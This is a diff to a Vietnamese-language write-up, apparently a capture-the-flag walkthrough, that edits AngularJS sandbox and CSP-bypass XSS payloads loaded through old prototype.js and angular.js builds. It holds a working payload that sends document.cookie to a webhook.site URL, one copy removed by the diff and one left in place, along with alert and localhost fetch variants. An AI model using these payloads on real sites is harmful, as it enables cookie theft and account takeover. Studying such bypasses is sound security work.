@@ -42,9 +42,12 @@ Giờ mình chỉ việc sửa payload một chút để ăn cắp cookie của 
 ```html
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
-    <div ng-app ng-csp>
-      {{$on.curry.call().fetch('https://webhook.site/5ff8415e-1c7c-46eb-9d75-c69ef358de6b'+document.cookie)}}
-    </div>
+<div ng-app ng-csp>
+{{$on.curry.call().$eval('alert(1)')}}
+</div>
 ```
 
 fetch('https://webhook.site/5ff8415e-1c7c-46eb-9d75-c69ef358de6b' %2B document.cookie)
+```
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script> <div ng-app ng-csp>{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }} </div>
+```
